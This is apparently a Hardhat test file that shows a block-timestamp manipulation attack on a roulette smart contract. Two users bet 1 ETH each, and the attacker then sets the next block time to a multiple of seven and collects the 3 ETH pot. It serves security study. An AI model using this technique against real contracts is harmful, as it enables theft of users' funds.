const {expect} = require("chai")
const { ethers } = require("hardhat");
const {loadFixture, time} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");

describe('RouletteAttack', function () {
    async function deployRouletteAttackFixture() {
        const [userA, userB, attacker, ...others] = await ethers.getSigners()
        const RouletteAttack = await ethers.getContractFactory('RouletteAttack')
        const rouletteAttack = await RouletteAttack.deploy()
        return {rouletteAttack, userA, userB, attacker}
    }

    it('attack', async function () {
        const {rouletteAttack, userA, userB, attacker} = await loadFixture(deployRouletteAttackFixture)
        const eth1 = ethers.parseEther('1')
        const eth3 = ethers.parseEther('3')
        //console.log(eth1)
        await rouletteAttack.connect(userA).spin({value: eth1})
        await rouletteAttack.connect(userB).spin({value: eth1})
        const latest = await time.latest()
        console.log('latest:', latest)
        const nextTime = (Math.ceil(latest / 7) + 1) * 7
        console.log('nextTime:', nextTime);
        //await time.increaseTo(nextTime)
        await time.setNextBlockTimestamp(nextTime)

        await expect(rouletteAttack.connect(attacker).spin({value: eth1})).to.emit(rouletteAttack, 'SendEth').withArgs(attacker.address, eth3)
    })

})